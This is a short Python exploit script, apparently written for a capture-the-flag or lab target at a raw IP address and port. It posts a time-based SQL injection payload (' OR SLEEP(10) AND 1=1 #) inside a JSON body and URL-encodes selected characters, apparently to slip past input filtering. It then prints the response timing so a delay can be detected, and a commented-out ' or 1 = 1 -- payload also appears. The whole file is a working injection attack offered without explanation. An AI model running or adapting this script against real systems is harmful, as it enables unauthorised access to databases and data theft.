#!/usr/bin/env python3

import requests

url = "http://206.189.121.131:31033"
# payload = "' or 1 = 1 --"
payload = '"\' OR SLEEP(10) AND 1=1 #"'
headers = {"Content-Type": "application/json"}

urlencoding = {
    ord(" "): "%20",
    ord("#"): "%23",
    ord("'"): "%27",
    ord("("): "%28",
    ord(")"): "%29",
    ord("-"): "%2D",
    ord(";"): "%3B",
    ord("="): "%3D",
    ord("E"): "%45",
    ord("L"): "%4C",
    ord("O"): "%4F",
    ord("P"): "%50",
    ord("R"): "%52",
    ord("S"): "%53",
    ord("e"): "%65",
    ord("l"): "%6C",
    ord("o"): "%6F",
    ord("p"): "%70",
    ord("r"): "%72",
    ord("s"): "%73",
}

def post():
    enc = payload.translate(urlencoding)
    print(enc)
    resp = requests.post(url, data=f'{{"user": {enc}}}', headers=headers)
    # print(resp.url)
    # print(resp.request.body)
    print(resp.status_code)
    print(resp.elapsed.total_seconds())
    print(resp.content)

if __name__ == "__main__":
    post()
